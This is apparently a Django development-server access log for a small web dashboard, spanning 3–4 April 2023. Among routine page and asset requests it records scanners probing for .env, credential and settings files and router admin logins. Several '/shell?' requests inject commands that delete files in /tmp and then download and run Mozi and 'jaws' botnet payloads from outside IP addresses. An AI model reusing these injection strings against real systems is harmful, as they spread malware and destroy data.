+Invalid HTTP_HOST header: 'stradvert'. You may need to add 'stradvert' to ALLOWED_HOSTS.
+Bad Request: /boaform/admin/formLogin
+[03/Apr/2023 12:37:58] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 400 63652
+[03/Apr/2023 13:05:02] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 13:29:53] code 400, message Bad request version ('À\x14À')
+[03/Apr/2023 13:29:53] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[03/Apr/2023 13:36:54] "GET /.env HTTP/1.1" 301 0
+[03/Apr/2023 13:36:55] "POST / HTTP/1.1" 301 0
+[03/Apr/2023 13:40:37] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 13:44:21] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 13:52:28] "GET / HTTP/1.1" 200 3497
+[03/Apr/2023 14:04:25] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 14:25:08] "GET /wp-login.php HTTP/1.1" 301 0
+[03/Apr/2023 14:25:10] "GET /wp-login.php HTTP/1.1" 302 0
+[03/Apr/2023 14:25:11] "GET /login/?next=/wp-login.php HTTP/1.1" 200 5163
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /robots.txt
+[03/Apr/2023 15:13:53] "GET /robots.txt HTTP/1.1" 400 64836
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[03/Apr/2023 15:13:53] "GET / HTTP/1.1" 400 64944
+[03/Apr/2023 15:34:24] "GET / HTTP/1.1" 301 0
+Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /shell
+[03/Apr/2023 16:10:30] "GET /.ftpconfig HTTP/1.1" 302 0
+[03/Apr/2023 16:10:58] "GET /.ftpconfig HTTP/1.1" 302 0
+[03/Apr/2023 16:11:26] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://59.99.46.254:43014/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[03/Apr/2023 16:37:25] "GET / HTTP/1.1" 400 65419
+[03/Apr/2023 16:43:23] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 16:57:02] code 400, message Bad request syntax ('\x16\x03\x01\x00ê\x01\x00\x00æ\x03\x03áÃ°®£$')
+[03/Apr/2023 16:57:02] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[03/Apr/2023 16:57:02] code 400, message Bad request version ('À\x13À')
+[03/Apr/2023 16:57:02] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[03/Apr/2023 16:57:03] code 400, message Bad request version ('À\x13À')
+[03/Apr/2023 16:57:03] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[03/Apr/2023 16:57:03] code 400, message Bad request version ('\x8f')
+[03/Apr/2023 16:57:03] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[03/Apr/2023 16:57:03] "GET /gate.php HTTP/1.1" 301 0
+[03/Apr/2023 16:57:03] code 400, message Bad request version ('À\x13À')
+[03/Apr/2023 16:57:03] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[03/Apr/2023 16:57:03] "GET /robots.txt HTTP/1.1" 301 0
+[03/Apr/2023 16:57:03] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 16:57:03] "GET /robots.txt HTTP/1.1" 301 0
+[03/Apr/2023 16:57:03] "GET /99vt HTTP/1.1" 301 0
+[03/Apr/2023 16:57:03] "GET /aaaaaaaaaaaaaaaaaaaaaaaaaqr HTTP/1.1" 301 0
+[03/Apr/2023 16:57:05] code 400, message Bad request syntax ('øû"â\x00³v-ÔÞ\x99¾<øè®\x17p=ìOx\x83À8\x97\x14fÛ\x0fI\x96')
+[03/Apr/2023 16:57:05] "øû"â ³v-ÔÞ¾<øè®p=ìOxÀ8fÛI" 400 -
+[03/Apr/2023 17:18:01] "GET / HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'localhost:8080'. You may need to add 'localhost' to ALLOWED_HOSTS.
+Bad Request: /
+[03/Apr/2023 17:20:08] "GET / HTTP/1.0" 400 63199
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /login/
+[03/Apr/2023 17:23:22] "GET /login/?next=/ HTTP/1.1" 400 65344
+[03/Apr/2023 17:45:29] "GET /robots.txt HTTP/1.1" 302 0
+[03/Apr/2023 17:45:30] "GET /login/?next=/robots.txt HTTP/1.1" 200 5163
+[03/Apr/2023 17:45:30] "GET /login/ HTTP/1.1" 200 5163
+[03/Apr/2023 17:45:33] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[03/Apr/2023 17:45:33] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
+[03/Apr/2023 17:45:33] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 200 9015
+[03/Apr/2023 17:45:33] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[03/Apr/2023 17:45:33] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 200 57180
+[03/Apr/2023 17:45:33] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[03/Apr/2023 17:45:33] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[03/Apr/2023 17:45:34] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[03/Apr/2023 17:45:34] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[03/Apr/2023 17:46:39] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 17:49:37] "GET / HTTP/1.1" 301 0
+Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /shell
+[03/Apr/2023 18:11:59] "GET /shell?cd+/tmp;rm+-rf+*;wget+161.35.208.230/jaws;sh+/tmp/jaws HTTP/1.1" 400 64106
+[03/Apr/2023 18:12:02] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 18:23:31] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 18:36:33] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 18:43:11] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+[03/Apr/2023 18:54:43] "HEAD / HTTP/1.1" 301 0
+[03/Apr/2023 18:54:43] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 19:19:04] "GET /.vscode/sftp.json HTTP/1.1" 302 0
+Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /shell
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /login/
+[03/Apr/2023 19:50:26] "GET /login/?next=/ HTTP/1.1" 400 65819
+Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /shell
+[03/Apr/2023 20:28:54] "GET /shell?cd+/tmp;rm+-rf+*;wget+45.81.243.34/jaws;sh+/tmp/jaws HTTP/1.1" 400 64092
+[03/Apr/2023 20:41:41] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 21:20:08] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 22:04:50] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 22:04:50] "GET / HTTP/1.1" 200 3497
+[03/Apr/2023 22:29:30] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'stradvert'. You may need to add 'stradvert' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[03/Apr/2023 22:34:33] "CONNECT www.google.com:443 HTTP/1.0" 400 62944
+[03/Apr/2023 22:41:04] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 22:57:02] "GET / HTTP/1.1" 301 0
+[03/Apr/2023 23:37:19] "GET /.env HTTP/1.1" 301 0
+[03/Apr/2023 23:37:19] "POST / HTTP/1.1" 301 0
+[04/Apr/2023 00:11:55] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 00:26:18] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 00:42:16] "GET /config/default.json HTTP/1.1" 301 0
+[04/Apr/2023 00:42:16] "GET /config/default.json HTTP/1.1" 302 0
+[04/Apr/2023 00:42:17] "GET /login/?next=/config/default.json HTTP/1.1" 200 5163
+[04/Apr/2023 00:42:24] "GET /config.json HTTP/1.1" 301 0
+[04/Apr/2023 00:42:24] "GET /config.json HTTP/1.1" 302 0
+[04/Apr/2023 00:42:25] "GET /login/?next=/config.json HTTP/1.1" 200 5163
+[04/Apr/2023 00:42:32] "GET /config/config.json HTTP/1.1" 301 0
+[04/Apr/2023 00:42:32] "GET /config/config.json HTTP/1.1" 302 0
+[04/Apr/2023 00:42:33] "GET /login/?next=/config/config.json HTTP/1.1" 200 5163
+[04/Apr/2023 00:42:40] "GET /credentials/config.json HTTP/1.1" 301 0
+[04/Apr/2023 00:42:40] "GET /credentials/config.json HTTP/1.1" 302 0
+[04/Apr/2023 00:42:41] "GET /login/?next=/credentials/config.json HTTP/1.1" 200 5163
+[04/Apr/2023 00:42:48] "GET /.env.bak HTTP/1.1" 301 0
+[04/Apr/2023 00:42:48] "GET /.env.bak HTTP/1.1" 302 0
+[04/Apr/2023 00:42:48] "GET /login/?next=/.env.bak HTTP/1.1" 200 5163
+[04/Apr/2023 00:42:56] "GET /.env.production HTTP/1.1" 301 0
+[04/Apr/2023 00:42:56] "GET /.env.production HTTP/1.1" 302 0
+[04/Apr/2023 00:42:57] "GET /login/?next=/.env.production HTTP/1.1" 200 5163
+[04/Apr/2023 00:43:03] "GET /.env.example HTTP/1.1" 301 0
+[04/Apr/2023 00:43:03] "GET /.env.example HTTP/1.1" 302 0
+[04/Apr/2023 00:43:04] "GET /login/?next=/.env.example HTTP/1.1" 200 5163
+[04/Apr/2023 00:43:11] "GET /api/.env HTTP/1.1" 301 0
+[04/Apr/2023 00:43:11] "GET /api/.env HTTP/1.1" 302 0
+[04/Apr/2023 00:43:12] "GET /login/?next=/api/.env HTTP/1.1" 200 5163
+[04/Apr/2023 00:43:19] "GET /sendgrid.env HTTP/1.1" 301 0
+[04/Apr/2023 00:43:19] "GET /sendgrid.env HTTP/1.1" 302 0
+[04/Apr/2023 00:43:20] "GET /login/?next=/sendgrid.env HTTP/1.1" 200 5163
+[04/Apr/2023 00:43:27] "GET /.env HTTP/1.1" 301 0
+[04/Apr/2023 00:43:27] "GET /.env HTTP/1.1" 302 0
+[04/Apr/2023 00:43:28] "GET /login/?next=/.env HTTP/1.1" 200 5163
+[04/Apr/2023 00:43:35] "GET /assets/app.config.json HTTP/1.1" 301 0
+[04/Apr/2023 00:43:35] "GET /assets/app.config.json HTTP/1.1" 302 0
+[04/Apr/2023 00:43:35] "GET /login/?next=/assets/app.config.json HTTP/1.1" 200 5163
+[04/Apr/2023 00:43:43] "GET /config.php.bak HTTP/1.1" 301 0
+[04/Apr/2023 00:43:43] "GET /config.php.bak HTTP/1.1" 302 0
+[04/Apr/2023 00:43:44] "GET /login/?next=/config.php.bak HTTP/1.1" 200 5163
+[04/Apr/2023 00:43:51] "GET /settings.php.bak HTTP/1.1" 301 0
+[04/Apr/2023 00:43:51] "GET /settings.php.bak HTTP/1.1" 302 0
+[04/Apr/2023 00:43:52] "GET /login/?next=/settings.php.bak HTTP/1.1" 200 5163
+[04/Apr/2023 00:44:06] "GET /settings.py HTTP/1.1" 301 0
+[04/Apr/2023 00:44:06] "GET /settings.py HTTP/1.1" 302 0
+[04/Apr/2023 00:44:07] "GET /login/?next=/settings.py HTTP/1.1" 200 5163
+[04/Apr/2023 00:44:14] "GET /app/settings.py HTTP/1.1" 301 0
+[04/Apr/2023 00:44:14] "GET /app/settings.py HTTP/1.1" 302 0
+[04/Apr/2023 00:44:15] "GET /login/?next=/app/settings.py HTTP/1.1" 200 5163
+[04/Apr/2023 00:44:22] "GET /django/settings.py HTTP/1.1" 301 0
+[04/Apr/2023 00:44:22] "GET /django/settings.py HTTP/1.1" 302 0
+[04/Apr/2023 00:44:23] "GET /login/?next=/django/settings.py HTTP/1.1" 200 5163
+[04/Apr/2023 00:44:30] "GET /settings/settings.py HTTP/1.1" 301 0
+[04/Apr/2023 00:44:30] "GET /settings/settings.py HTTP/1.1" 302 0
+[04/Apr/2023 00:44:30] "GET /login/?next=/settings/settings.py HTTP/1.1" 200 5163
+[04/Apr/2023 00:44:38] "GET /web/settings/settings.py HTTP/1.1" 301 0
+[04/Apr/2023 00:44:38] "GET /web/settings/settings.py HTTP/1.1" 302 0
+[04/Apr/2023 00:44:38] "GET /login/?next=/web/settings/settings.py HTTP/1.1" 200 5163
+[04/Apr/2023 00:44:46] "GET /credentials.json HTTP/1.1" 301 0
+[04/Apr/2023 00:44:46] "GET /credentials.json HTTP/1.1" 302 0
+[04/Apr/2023 00:44:47] "GET /login/?next=/credentials.json HTTP/1.1" 200 5163
+[04/Apr/2023 00:44:54] "GET /assets/credentials.json HTTP/1.1" 301 0
+[04/Apr/2023 00:44:54] "GET /assets/credentials.json HTTP/1.1" 302 0
+[04/Apr/2023 00:44:54] "GET /login/?next=/assets/credentials.json HTTP/1.1" 200 5163
+[04/Apr/2023 00:45:02] "GET /environment.rb HTTP/1.1" 301 0
+[04/Apr/2023 00:45:02] "GET /environment.rb HTTP/1.1" 302 0
+[04/Apr/2023 00:45:02] "GET /login/?next=/environment.rb HTTP/1.1" 200 5163
+[04/Apr/2023 00:45:10] "GET /config/environment.rb HTTP/1.1" 301 0
+[04/Apr/2023 00:45:10] "GET /config/environment.rb HTTP/1.1" 302 0
+[04/Apr/2023 00:45:10] "GET /login/?next=/config/environment.rb HTTP/1.1" 200 5163
+[04/Apr/2023 00:45:18] "GET /redmine/config/environment.rb HTTP/1.1" 301 0
+[04/Apr/2023 00:45:18] "GET /redmine/config/environment.rb HTTP/1.1" 302 0
+[04/Apr/2023 00:45:18] "GET /login/?next=/redmine/config/environment.rb HTTP/1.1" 200 5163
+[04/Apr/2023 00:45:26] "GET /config.rb HTTP/1.1" 301 0
+[04/Apr/2023 00:45:26] "GET /config.rb HTTP/1.1" 302 0
+[04/Apr/2023 00:45:26] "GET /login/?next=/config.rb HTTP/1.1" 200 5163
+[04/Apr/2023 01:18:35] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 01:36:35] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 01:36:35] "GET / HTTP/1.1" 200 3497
+[04/Apr/2023 01:54:42] "GET / HTTP/1.1" 301 0
+Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /shell
+[04/Apr/2023 03:24:15] "GET /shell?cd+/tmp;rm+-rf+*;wget+45.81.243.34/jaws;sh+/tmp/jaws HTTP/1.1" 400 64092
+[04/Apr/2023 03:27:25] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 03:54:57] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 04:09:30] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+[04/Apr/2023 04:31:02] "GET / HTTP/1.1" 200 3497
+[04/Apr/2023 04:31:03] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[04/Apr/2023 04:31:03] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[04/Apr/2023 04:31:03] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[04/Apr/2023 04:31:03] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[04/Apr/2023 04:31:03] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 200 57180
+[04/Apr/2023 04:31:03] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[04/Apr/2023 04:31:03] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 200 9015
+[04/Apr/2023 04:31:03] "GET /static/assets/img/theme/str-logo.png HTTP/1.1" 200 24457
+[04/Apr/2023 04:31:03] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[04/Apr/2023 04:31:04] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
+[04/Apr/2023 04:31:04] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[04/Apr/2023 04:31:05] "GET /static/assets/vendor/nucleo/fonts/nucleo-icons.woff2 HTTP/1.1" 200 8580
+[04/Apr/2023 04:31:06] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[04/Apr/2023 04:31:13] "GET /login/ HTTP/1.1" 200 5163
+[04/Apr/2023 04:31:38] "POST /login/ HTTP/1.1" 200 5140
+[04/Apr/2023 04:32:00] "GET /login/ HTTP/1.1" 200 5163
+[04/Apr/2023 04:32:03] "GET / HTTP/1.1" 200 3497
+[04/Apr/2023 05:08:55] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 0
+[04/Apr/2023 05:08:55] code 400, message Bad request version ('À\x13À')
+[04/Apr/2023 05:08:55] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[04/Apr/2023 05:20:14] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 06:07:22] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 06:36:05] "GET /actuator/gateway/routes HTTP/1.1" 301 0
+[04/Apr/2023 06:36:09] code 400, message Bad request version ('À\x13À')
+[04/Apr/2023 06:36:09] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[04/Apr/2023 06:39:18] code 400, message Bad request syntax ('MGLNDD_5.161.208.197_80')
+[04/Apr/2023 06:39:18] "MGLNDD_5.161.208.197_80" 400 -
+[04/Apr/2023 07:10:03] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 07:11:48] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 07:12:39] "GET /favicon.ico HTTP/1.1" 301 0
+[04/Apr/2023 07:13:50] "GET /geoserver/web/ HTTP/1.1" 301 0
+[04/Apr/2023 07:17:21] "GET /login/ HTTP/1.1" 200 5163
+[04/Apr/2023 07:50:53] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 07:56:13] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 07:59:25] "GET / HTTP/1.1" 200 3497
+[04/Apr/2023 07:59:25] "GET /robots.txt HTTP/1.1" 301 0
+[04/Apr/2023 07:59:26] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[04/Apr/2023 07:59:26] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 200 9015
+[04/Apr/2023 07:59:26] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 200 57180
+[04/Apr/2023 07:59:26] "GET /static/assets/img/theme/str-logo.png HTTP/1.1" 200 24457
+[04/Apr/2023 07:59:26] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[04/Apr/2023 07:59:26] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[04/Apr/2023 07:59:26] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[04/Apr/2023 07:59:26] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[04/Apr/2023 07:59:27] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[04/Apr/2023 07:59:27] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[04/Apr/2023 07:59:27] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
+[04/Apr/2023 07:59:27] "GET /static/assets/vendor/nucleo/fonts/nucleo-icons.woff2 HTTP/1.1" 200 8580
+[04/Apr/2023 07:59:31] "GET /login/ HTTP/1.1" 200 5163
+[04/Apr/2023 08:03:00] "POST /login/ HTTP/1.1" 302 0
+[04/Apr/2023 08:03:01] "GET /dashboard HTTP/1.1" 200 13279
+[04/Apr/2023 08:03:02] "GET /static/assets/vendor/chart.js/dist/Chart.min.js HTTP/1.1" 200 172812
+[04/Apr/2023 08:03:02] "GET /static/assets/vendor/chart.js/dist/Chart.extension.js HTTP/1.1" 200 3552
+[04/Apr/2023 08:03:03] "GET /static/assets/vendor/@fortawesome/fontawesome-free/webfonts/fa-solid-900.woff2 HTTP/1.1" 200 76084
+[04/Apr/2023 08:05:45,512] - Broken pipe from ('172.68.203.145', 19284)
+
+[04/Apr/2023 08:05:46,734] - Broken pipe from ('172.68.203.136', 44814)
+
+[04/Apr/2023 08:06:45] "GET /profile.html HTTP/1.1" 200 8948
+[04/Apr/2023 08:06:46] "GET /static/assets/img/theme/user.png HTTP/1.1" 200 24784
+[04/Apr/2023 08:06:50] "GET /dashboard HTTP/1.1" 200 13279
+[04/Apr/2023 08:12:12] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 08:47:20] "GET /robots.txt HTTP/1.1" 301 0
+[04/Apr/2023 08:47:21] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 08:47:21] "GET / HTTP/1.1" 200 3497
+[04/Apr/2023 09:20:44] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 09:20:51] "GET / HTTP/1.1" 200 3497
+[04/Apr/2023 09:21:19] code 400, message Bad request version ('®')
+[04/Apr/2023 09:21:19] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[04/Apr/2023 09:21:21] "OPTIONS / HTTP/1.0" 301 0
+[04/Apr/2023 09:33:00] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 09:37:33] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 09:59:06] "HEAD / HTTP/1.1" 301 0
+[04/Apr/2023 09:59:09] "GET / HTTP/1.1" 301 0
+Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /shell
+[04/Apr/2023 10:15:28] "GET /.env HTTP/1.1" 301 0
+[04/Apr/2023 10:15:28] "GET /.env HTTP/1.1" 302 0
+[04/Apr/2023 10:15:28] "GET /login/?next=/.env HTTP/1.1" 200 5163
+[04/Apr/2023 10:15:29] "GET /xmlrpc.php HTTP/1.1" 301 0
+[04/Apr/2023 10:15:29] "GET /xmlrpc.php HTTP/1.1" 302 0
+[04/Apr/2023 10:15:29] "GET /login/?next=/xmlrpc.php HTTP/1.1" 200 5163
+[04/Apr/2023 10:33:43] "GET /robots.txt HTTP/1.1" 302 0
+[04/Apr/2023 10:33:43] "GET /login/?next=/robots.txt HTTP/1.1" 200 5163
+[04/Apr/2023 10:37:45] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 11:30:59] "GET / HTTP/1.1" 200 3497
+[04/Apr/2023 12:15:23] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 12:15:23] code 505, message Invalid HTTP version (2.0)
+[04/Apr/2023 12:15:23] "PRI * HTTP/2.0" 505 -
+[04/Apr/2023 12:15:23] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 12:15:23] code 505, message Invalid HTTP version (2.0)
+[04/Apr/2023 12:15:23] "PRI * HTTP/2.0" 505 -
+[04/Apr/2023 12:15:23] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 12:15:23] code 505, message Invalid HTTP version (2.0)
+[04/Apr/2023 12:15:23] "PRI * HTTP/2.0" 505 -
+[04/Apr/2023 13:02:57] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 13:20:56] code 400, message Bad request version ('\x8a¢¹eí\x19\x1bî«\x833Õ/:ög¹¥b´\x82ÓO\x8e')
+[04/Apr/2023 13:20:56] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[04/Apr/2023 13:20:59] "OPTIONS / HTTP/1.0" 301 0
+[04/Apr/2023 13:34:31] code 400, message Bad request version ('À\x14À')
+[04/Apr/2023 13:34:31] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[04/Apr/2023 13:42:51] "GET / HTTP/1.1" 200 3497
+[04/Apr/2023 13:42:52] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[04/Apr/2023 13:42:52] "GET /favicon.ico HTTP/1.1" 302 0
+[04/Apr/2023 13:42:52] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+[04/Apr/2023 13:44:52] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 13:44:53] "GET / HTTP/1.1" 200 3497
+[04/Apr/2023 13:44:55] "GET /login/ HTTP/1.1" 301 0
+[04/Apr/2023 13:44:56] "GET /login/ HTTP/1.1" 200 5163
+[04/Apr/2023 14:02:58,664] - Broken pipe from ('198.74.56.46', 35410)
+
+[04/Apr/2023 14:02:58] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 14:12:11] "GET /wp-login.php HTTP/1.1" 301 0
+[04/Apr/2023 14:12:18] "GET /wp-login.php HTTP/1.1" 302 0
+[04/Apr/2023 14:12:22] "GET /login/?next=/wp-login.php HTTP/1.1" 200 5163
+[04/Apr/2023 14:14:59] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 14:17:46] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 14:17:47] code 400, message Bad request version ('À\x14À')
+[04/Apr/2023 14:17:47] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[04/Apr/2023 14:22:33] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 14:48:35] "GET / HTTP/1.1" 301 0
+[04/Apr/2023 14:49:15] code 400, message Bad request version ('\x95aÞ«¨·£§;\x19Þ³×')
+[04/Apr/2023 14:49:15] "oúÀ¾¸À¤É¢Â¯¾Í¹Ï¬°« ¶±ªÎ´³µÍ¦úúúúýØøúúÂúúúúfìùúúúúûåqòúúúúúúùwhuiºê=Eð/§XJñ1Y¿±K úø¯5YÛ¡¢ à0ÌºU]<ºÇW7cÉ96Å4yRçwÍé!KEá ,)ê_I(?­Xx×ç¶7ñü;È®ÝÊ¿ÓðªÙ=ÐÐÖï«QZ`¼rhc@[zêJ|ïVÜ»\øTó=¯½8­çe~`ovÌ¶ÊÞ·8ÜØ8w9ÑÞ/Ê%Ü+sb®å&Êÿv¥í¼ê2ú7Ég)TF$H¨Ò¢4«gF+¿x*wÿÏ¨JrF.òîYÔþL6	ò5\íbÍ§|ÉzL£Äg´(ãkGkÁBæ][á?Tuaàüë«ÀåÖÕà<ê Téy-GÅRôÁÖ½i»f¼1Z-ýNC*mk¼ZaÞ«¨·£§;Þ³×" 400 -
+[04/Apr/2023 14:49:46] code 400, message Bad request version ('âûuGEº_¯YçP+öPãKyëÖ\x8cdÑ\x00é¢í\x16\x08IRMkÉ-\x7f¾ìµT')
+[04/Apr/2023 14:49:46] "ÿ¢ÿ ÿ=ÿ­ÿ ÿÑÿØñ­ÿ¾Hû_5ÿ­ñlåúp7­ÍØ¢mx ç°¯iç¾¯ÈÄv~9,¨*öpDÊ$ï$¯¬Â+	ÊsÙ\&'âõú?±HwF»¿[âãÄ&ôÁÂ+}k{/C'qléÓM©/5j{Î+9õA}(¡ÏzÜ¯¤Ýé¶ÉR\Dìo¸óNO£`ÜaXaî¾i4ÔÄà[·¹`ßeºms]C<è-ÑºÙ,Ô£oà6£î¶h±¬^êÑôIÿäáçû¹ç?Æf}ð£ð6éÆ¿K(OÒ&«4Ó_ Æ¤"öHmÖ6åõÁzd`ð²âËßÈ`L y=ib#|æÁÖH4~<ØLU\}÷ÿÉ.`E1ê²}-tÇà}ÐíR7p$'áÿ¯Ì"rtôqç)js'X°d¨?æ.c(8vü/b"EýªkQ6%OÕBÝG^ùÐõýì^ïCû(p<Ý9ÇÉöLæ§tÚC´­È}D¶¯f'!§xqë ÞDS0´·\áC¹ìeªC<¼ØÏfßX­¾zoúP 0Þ(¤þ`FèÂ½ËË w¨òmP¬SJëøM4Ú_ÚèÐÌô«Ê6ñöH¸Fß'»ïµúÜÃ*@¥`+þúÞO<LjÐ~"TÃNú^ßÎ½°@~>Oú´ã ã?EâtÄ?2¡ÐÅí:×ÕÌWyÊl¹´Ù¶¤Iñë²xH¦¼ìLÅ$FJeBfb4.°¨ÆÈ1Ãx\}äõéª~ÄíÍ·æ	 âûuGEº_¯YçP+öPãKyëÖdÑ é¢íIRMkÉ-¾ìµT" 400 -
+[04/Apr/2023 14:49:46] code 400, message Bad request syntax ('\x02')
+[04/Apr/2023 14:49:46] "" 400 -
+[04/Apr/2023 14:49:46] code 400, message Bad request syntax ('\x00\x00\x00')
+[04/Apr/2023 14:49:46] "   " 400 -
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /.well-known/assetlinks.json
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+[04/Apr/2023 15:18:09] "GET /.well-known/assetlinks.json HTTP/1.1" 400 64911
+Bad Request: /.well-known/assetlinks.json
+[04/Apr/2023 15:18:09] "GET /.well-known/assetlinks.json HTTP/1.1" 400 64911
+[04/Apr/2023 15:20:06] "GET / HTTP/1.1" 301 0
